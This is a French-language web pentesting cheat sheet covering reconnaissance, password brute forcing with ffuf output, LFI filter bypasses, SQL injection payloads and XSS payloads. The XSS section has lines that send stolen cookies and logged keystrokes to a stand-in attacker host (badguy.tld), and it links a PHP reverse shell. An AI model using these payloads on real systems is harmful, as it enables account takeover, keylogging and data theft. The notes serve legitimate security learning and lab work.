---
title: "Eth Piracy: Web Application Exploitation"
---

<p style="text-align: right">_- last update 22/11/2021 -_</p>

Avant de commencer, le [web security testing guide](https://owasp.org/www-project-web-security-testing-guide/stable/)
est un excellent document pour réaliser un test d'intrusion web.

## Recon

### Scanners de vulnérabilités

L'outil [nessus](https://www.tenable.com/products/nessus) est un scanner très
célèbre et qui permet d'obtenir une vision très graphique du scan. Cela peut
être un bon point de départ pour identifier les vulnérabilités les plus
évidentes.

### Découverte de sous-domaines

#### Brute force

On peut utiliser l'outil [dnsrecon](https://github.com/darkoperator/dnsrecon)
pour cela. Dans la commande suivante on bruteforce `btr` les sous domaines en
utilisant le dictionnaire par défaut de l'outil.

```bash
dnsrecon -t brt -d target.tld
```

#### OSINT

Les autorités de certifications offrent un service appelé "Certificate 
Transparency log". C'est un journal qui contient tout les certificats émis par
cette CA. Ca permet à l'origine d'éviter l'utilisation de certificats
malveillant. Cette base permet aussi de chercher les nom de domaine/
sous-domaines qui ont eu un certificat donné. Deux moteurs de recherches sont
accessibles pour ces CTL:

* [crt.sh](https://crt.sh/)
* [google](https://transparencyreport.google.com/https/certificates)

L'indexation google est aussi très puissante. Ce type de recherche permet
d'avancer pas à pas jusqu'a obtenir tous les noms indexés:

```txt
site:*.target.tld -site:www.target.tld -site:...
```

L'outil [sublist3r](https://github.com/aboul3la/Sublist3r) permet d'automatiser
ce processus.

```bash
sublist3r -d target.tld
```

Dans le même délire on peut aussi utiliser `amass` qui trouve d'autres trucs.

#### Virtual Hosts

Dans le cas ou le DNS n'est pas utilisable (par exemple il est dans un réseau
privé différent ou les enregistrements sont en dure dans le `/etc/hosts` des
clients). On peut essayer de découvrire les différents "virtual hosts" du
serveur cible.

Il faut jouer la commande une première foi et filter la taille la plus courante
(c'est la réponse dans le cas ou il n'y à pas de virt host sous ce nom).

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt \
		 -H "Host: FUZZ.acmeitsupport.thm" \
		 -u http://10.10.152.203 \
		 -fs '2395' # filter out size
```

### Découverte de contenu

Il est important d'avoir une bonne vision de la surface d'attaque. Pour cela on
peut utiliser des méthodes passives ou actives.

#### Passives

##### Contenu

Récupérer le code "client" de l'application en suivant tout les liens possibles:

```bash
wget --recursive $TARGET
```

Pour traiter le javascript, une fois qu'on à extrait les fichiers avec `wget`,
on peut les déminifier avec l'outil [jsbeautifier](https://github.com/beautify-web/js-beautify).

```bash
pip install jsbeautifier
js-beautify -r $(find mywebsite.tld -name '*.js')
```

On peut chercher d'autres infos plus facilement du coup avec du grep.

```bash
grep -ir 'http[s]*://.*mywebsite' $(find mywebsite.tld -name '*.css' -or -name '*.js')
```

Cela permet ensuite de réaliser une recherche par texte dans le code:

* `grep -Pzro '(?s)<!--.*?-->'`: pour récupérer les commentaires ([sources](https://stackoverflow.com/questions/3717772/regex-grep-for-multi-line-search-needed/7167115#7167115))
* `grep -r submit` ou `grep -r 'type="submit"'`: pour lister les points d'entrer

Voir également [ce gist](https://gist.github.com/nstarke/4f0eba4d1765b9d48fe884301cd5aedf)
pour chercher des commentaires et autre.

On peut alors également récupérer le fichier `robots.txt`:

```bash
cat $TARGET/robots.txt
```

Le fichier `sitemap.xml` contient des routes pondérés pour la SEO:

```bash
curl -O $TARGET/sitemap.xml
```

Trouver des infos (notemment la version du serveur web) dans le header `Server`:

```bash
curl -i $TARGET
```

Le site [wayback machine](https://archive.org/web/) permet, pour de vieilles
applications, d'accéder à des endpoint qui sont toujours accessibles mais qui ne
sont plus référencés.


##### Versions

Trouver les framework / technos utilisés :

* Serveur web
* Framework js front
* Framework backend
* Database
* OS

Pour cela on peut utiliser [Wappalyzer](https://www.wappalyzer.com/).

Les framework mettent souvent à disposition leurs favicon dans la version de
dévellopement d'origine, cela permet de savoir quelle technos est derrière. Pour
aider, l'OWASP à [une liste des md5 des favicon les plus courant](https://wiki.owasp.org/index.php/OWASP_favicon_database).

##### Données techniques

Récupération des données techniques :

* github
* blog technique
* google hacking
* bases whois
* forums

Récupération des bucket s3 : chercher des bucket avec le format 
`http[s]://{name}.s3.amazonaws.com` ou la valeur `{name}` peut prendre des
variations:

* `{name}-assets`
* `{name}-private`
* `{name}-public`
* `{name}-www`

Tester le suffix `/.git` sur toutes les routes pour vérifier qu'aucune ne permet
d'extraire le code. Si c'est le cas, utiliser [gitjacker](https://github.com/liamg/gitjacker).

**Si on trouve des pages d'administration, penser aux MDP par defaut !**
 
### Google Hacking/Dorking

Google à une fonctionnalité de "recherches avancés" qui peut être très utile
pour faire de l'OSINT. Un [tutoriel très synthétique](https://support.google.com/websearch/answer/2466433)
existe dans la documentation de google. Il est difficile de trouver une
documentation officielle détaillée, il faut parcourir des [cheat sheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06)
sur le sujet.

Parmis les plus utiles:

* `site:...`
* `inurl:...`
* `filetype:...`
* `intitle:...`

Typiquement `site:target.net admin` est une recherche qui peut souvent
apporter plein d'infos intéressantes.

## Reverse Connection

Il est souvent utile de recevoir des connections depuis une cible, par exemple
pour obtenir le résultat d'une XSS stockée ou d'un reverse shell.
Pour ça il existe quelques outils tel que [ngrok](https://ngrok.com/) pour
exposer, sur internet, un port local de manière temporaire. Cependant, certain
de ces services sont payants, nécéssitent la création d'un compte ou, au moins,
l'installation d'un programme tiers. Pourtant, il n'est absolument pas 
nécessaire de faire appel à un service tiers pour de telles taches. Il suffit
d'un serveur publique avec un accès SSH.

Dans un premier temps il faut simplement décommenter l'option `GatewayPorts` et
la mettre à true dans le fichier de configuration ssh du serveur publique:
```bash
# cat /etc/ssh/sshd_config | grep Gateway
GatewayPorts yes
```

Ensuite, pour exporter un port local sur internet:
```bash
ssh -NR 4444:localhost:8000 tristan@tic.sh &
```

Le port `8000` local sera exposé sur le port `4444` de `tic.sh` et les requettes
seront toutes forwardé. L'option `-N` évite d'ouvrir un shell et le `&` à la fin
de la ligne permet de jouer cette commande en background et donc de
redonner la main au shell.

[request.bin](https://requestbin.com/) est cool pour vérifier ce type d'infos.

## Attaque par dictionnaire

Outil de prédilection : [ffuf](https://github.com/ffuf/ffuf). Il remplace très
bien la fonctionnalité "intruder" de burp.

Dictionnaires de prédilection : [seclists](https://github.com/danielmiessler/SecLists).
La majorité des OS orienté sécurité offensive offrent un paquet `seclist` qui
installe tout les dictionnaires sous le chemin `/usr/share/seclists`.

Un exemple d'utilisation de fuff et seclist :

```txt
> ffuf -w /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -X POST -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' -u http://10.10.174.193/rest/user/login -fc 401 -H "Content-Type: application/json"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.174.193/rest/user/login
 :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"email":"admin@juice-sh.op","password":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 401
________________________________________________

admin123                [Status: 200, Size: 824, Words: 1, Lines: 1, Duration: 2297ms]
:: Progress: [1049/1049] :: Job [1/1] :: 70 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

Explication de la commande :
```bash
ffuf 
	-w /.../wordlist.txt \																	# wordlist path
	-X POST \																								# method
	-d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \	# FUZZ is a keyword
	-u http://10.10.174.193/rest/user/login \								# host to target
	-fc 401 \																								# filter out errors
	-H "Content-Type: application/json"											# put a header
```

On peut utiliser plusieurs dictionnaires à des endroits différents (`W1` et `W2`
seront remplacés par l'occurence du dictionnaire associé dans le reste de la 
requette à la place de `FUZZ`):

```bash
-w usernames.txt:W1,passwords.txt:W2
```

## IDOR

IDOR = **I**nsecure **D**irect **O**bject **R**eferences

C'est quand on peut appeler directement une route qui devrait être protégé.
Par exemple si il y à une liste d'item et que l'on peut accéder aux détail sous
la route `/items/<number>`, on peut tester de butforce `<number>`.

L'outil ffuz peut être utile pour tester ce type de scénario.

C'est pas exactement de l'IDOR mais on peut parfois exploiter le fait que des
méthodes ne soient pas tous protégés de la même façon pour une même route.
L'outil [httpmethods](https://github.com/ShutdownRepo/httpmethods) est excellent
pour tester ces cas.

## LFI

LFI = **L**ocal **F**ile **I**nclusion

Lorsqu'on peut controller le nom / l'emplacement d'un fichier qui va être traité
il est possible parfois d'accéder à des fichiers protégés. En fonction de la
maturité du site, il y à un certain nombre de filtres à passer.

Si il y à une vérification sur l'extention du fichier, par exemple si
l'application n'accepte que des fichiers finissant par `.png`, on peut ajouter
un null byte et donc envoyer un fichier avec ce nom : `upload.php%00.png`.

Il peut aussi y avoir une vérification sur l'utilisation de chemins relatifs
pour éviter le [path traversal](https://owasp.org/www-community/attacks/Path_Traversal)

Si l'application filtre les `../` on peut s'amuser à les doubler pour mettre
par exemple `....//`, il y à des chances pour que le moteur de regex ne fasse 
qu'une passe sur la chaine et ne supprime donc pas récursivement l'injection
de chemins.

On peut aussi utiliser le dossier local (`./`) pour asser les filtres en
texte pure.

Parfois, il ne suffit pas d'extraire le contenu du fichier. Il peut être executé
par le serveur (dans le cas d'une LFI sur un fichier PHP) ou le fichier contient
peut-être de la donnée binaire. Pour cela, en PHP, on peut utiliser des filtres
qui vont permettre d'encoder la donnée:

```txt
php://filter/convert.base64-encode/resource=FILE
```

## Bypass WAF

Ajouter un header [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
peut override celui du WAF et donc bypass la protection.

## SQL Injections

[suIP.biz](https://suip.biz/?act=sqlmap) propose un SQLmap en ligne pour faire
une première audite d'une appli.

[Damn Small SQLi Scanner](https://github.com/stamparm/DSSS) est une sorte de
mini sqlmap écrit en python en moins de 100 lignes de codes mais qui est très
pratique dans un environnement réstreint.

Les champs suivant sont utiles à extraires : 

* `database()`
* `user()`
* `@@version`
* `username`
* `password`
* `table_name`
* `column_name`

Il faut toujours tester à la main les choses les plus simples au cas ou: 
`admin' --`. Pour des tests plus complets, on peut utiliser les payload suivant:

* [sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads)
* [payloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

Ce [cheat sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
est une bonne référence sur les injections SQL.

A la fin de [la room sqlibasics](https://tryhackme.com/room/sqlibasics) sur 
tryhackme il y à plein d'idée de trucs pour aller plus loin.

### SQLmap

C'est l'outil de référence. Il ne faut pas perdre de temps et utiliser
absolument sqlmap si je découvre une injection possible. ([sqlmap cheat sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet))

Arguments intéressants:

* `--dbs` : list les databases
* `--dump & --dump-all` : Dump (retrieve) DBMS database
* `--os-shell` : Prompt for an interactive operating system shell
* `--batch` : Never ask for user input, use the default behavior
* `--dbms` : Provide back-end DBMS to exploit (i.e MySQL, PostgreSQL)
* `--passwords` : Enumerate DBMS users password hashes
* `--os-pwn` : Prompt for an OOB shell, Meterpreter or VNC
* `--wizard` : Simple wizard interface for beginner users
* `--level=LEVEL` : Level of tests to perform (1-5)
* `--risk=RISK` : Risk of tests to perform (1-3)
* `--all` : Retrieve everything

Exemple d'execution de base:

```bash
sqlmap --url "..." --batch
```

### Boolean based

Le résultat de la requête ne peut être que binaire. On à donc beaucoup moins
d'infos, aucune erreur n'est retourné.

Méthodologie:

1. Identifier un cas nominal (payload qui marche normalement, résultat = 1)
2. Faire une expression SQL simple qui casse le fonctionnement (résultat = 0)
3. Faire fonctionner le payload simple mais avec du SQL: preuve d'exploitabilité
4. Extraire des choses en répondant à des questions vrais/faux

**Exemple: extraire le nom de la DB**

* `substr((select database()),1,1)` donne le premier char du nom d'une db
* `ascii(char)` transforme un caractère en son code ascii

Le payload suivant va nous dire si la première lettre est un `a`:

```txt
1' AND (ascii(substr((select database()),1,1))) = 97 --+
```

On peut utiliser du les opérateurs `>` et `<` pour trouver les lettre en un
minimum de requettes possible. Il suffit de faire un pas à pas pour trouver les
bonnes lettre (sqlmap le fait aussi très bien mais on peut peut être faire
mieux, cela serait intéressant de le tester en python).

### Union based

Type d'injection SQL qui nous permettent d'utiliser le symbol `UNION` et donc
d'injecter le résultat d'une toute nouvelle requête dans la requête d'origine.

1. Trouver le point de vulnérabilité et provoquer une erreur
2. Essayer de comprendre ce qui à échouer et reconstruire la requête
3. Identifier si la requête est sensible aux `UNION ALL SELECT 'poc'`
4. Définir les tables qu'on vise
5. Définir le nb de champs
6. Extraire la donnée

Attention, il ne faut pas oublier d'encoder les requettes en url :

```
%27+UNION+SELECT+password,username+FROM+users+--
```

Exemple d'un payload utile pour récupérer la liste des champs d'une table:

```sql
UNION ALL SELECT 									/* pour une UNION SQLI */
	group_concat(column_name)				/* récupère la liste de tout les champs */
	,null,null,null,null 						/* met un null pour chaque champ: évite les erreurs */
	FROM information_schema.columns	/* une table système comportant des infos */
	WHERE table_name="people"				/* la table cible */
```

Minifié :

```sql
UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
```

#### Déterminer le nombres de colones

Technique des ORDER BY (une erreur = n-1):

```txt
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# and so on until an error occurs
```

Technique des null (pas d'erreurs = bon nombre):

```txt
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# until no error occurs
```

#### Déterminer le type de la colone

Pas d'erruer = type ok:

```txt
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

## Injections php

Si la variable `register_globals` [doc](https://www.php.net/manual/ro/security.globals.php),
est mise sur `on` dans le fichier de config de php, elle permet de surcharger
certains objets lors des appels. Par exemple le payload `_SESSION[logged]=1` en
argument d'un GET va mettre la variable `$_SESSION["logged"]` à `1` quand le 
code php sera executé.

`assert(` en php5 peut prendre une string en parametre, ça peut permettre de
faire executer du code à la volée. (voir les "warnings" de [la doc officielle](https://www.php.net/manual/en/function.assert.php))

## Injections javascript

Il y à plein de type différents d'xss:

* _reflected_: on peut injecter sur sa page (par les param GET par exemple)
* _stored_: l'xss est stocké dans la base et est peristante
* _dom based_: l'xss vient d'un élément qui est injecter depuis la page (chat)
* _blind_: on ne peux pas vérifier l'execution de l'xss ([voir xsshunter](https://xsshunter.com/))

**TIPS:** ça peut être très pratique d'encoder les données à extraire en base64

Examples de payload:

Pour être sure que le payload se joue, il vaut mieux utiliser une iframe:
```html
<iframe src="javascript:alert('xss')">
```

Quand le mot `script` est filtré:
```html
<img src="valid.img" width=0 height=0 onload="alert('xss')"/>
```

Utilisant fetch
```html
<script>fetch('https://badguy.tld/steal?cookie=' + btoa(document.cookie));</script>
```

Utilisant une image si fetch à été bloqué
```html
<script>document.write('<img src="https://...ngrok.io?' + btoa(document.cookie) + '"/>')</script>
```

Implémentant un keylogger:
```html
<script>document.onkeypress = function(e) { fetch('https://badguy.tld/log?key=' + btoa(e.key) );}</script>
```

Appeler une fonction déjà présente dans le site qui s'executera avec les
privilèges (cookies/autres) de la victime:
```html
<script>user.changeEmail('attacker@badguy.tld');</script>
```

Si jamais la cible n'est pas compatible avec [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) 
mais qu'il faut faire un POST depuis son navigateur, on peut étendre le dernier 
payload avec [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest):

```html
<script>
  var urlTarget = "...";
  var dataTarget = "key=value&key2=value2";
  var logHost = "tic.sh:4444";
  function reqSuccess () {
    document.write('<img src="http://' + logHost + '?state=OK&date=' + Date.now() + '"/>');
  }
  function reqFailure () {
    document.write('<img src="http://' + logHost + '?state=KO&date=' + Date.now() + '"/>');
  }
  var oReq = new XMLHttpRequest();
  oReq.addEventListener("load", reqSuccess);
  oReq.addEventListener("error", reqFailure);
  oReq.open("POST", urlTarget);
  oReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  oReq.send(dataTarget);
  document.write('<img src="http://' + logHost + '?state=done&date=' + Date.now() + '"/>');
</script>
```

Pour finir un polyglot cool:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## Reverse shell

[The pentestmonkey repo](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
contain a nice reverse proxy for php.

The variables `$ip` and `$port` must be changed, pointing to a listening netcat
connection. [Here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) 
is a direct download.

On peut trouver également des payload dans [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
et [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells).

## Breaking flash applications

[ruffle](http://ruffle.rs/#) est un émulateur pour flash écrit en rust. A
l'heure ou j'écris (17/11/2021), il ne supporte que ActionScript 1 et 2 mais
cela ne [devrais pas tarder](https://github.com/ruffle-rs/ruffle/wiki/Frequently-Asked-Questions-For-Users) 
pour la version 3. S'utilise comme un plugin du navigateur.

En attendant, il y à [lightspark](https://lightspark.github.io/).

## Working with cookies

Une bonne façons de réinjecter du token CSRF avec les fichiers de cookie au 
format Netscape.

```bash
curl -X PATCH 'https://target.tld/api/path' \
  -H "X-XSRF-TOKEN: $(cat cookies.txt | grep XSRF | cut -d $'\t' -f 7)" \
  -b cookies.txt \
  -H 'content-type: application/json' 
  -d '{"enabled":false}'
```

Le plugin [ExportCookies](https://github.com/rotemdan/ExportCookies) sur firefox
permet d'extraire les cookies du site une fois authentifié. Il y à aussi
l'option `--cookie-jar` de curl.

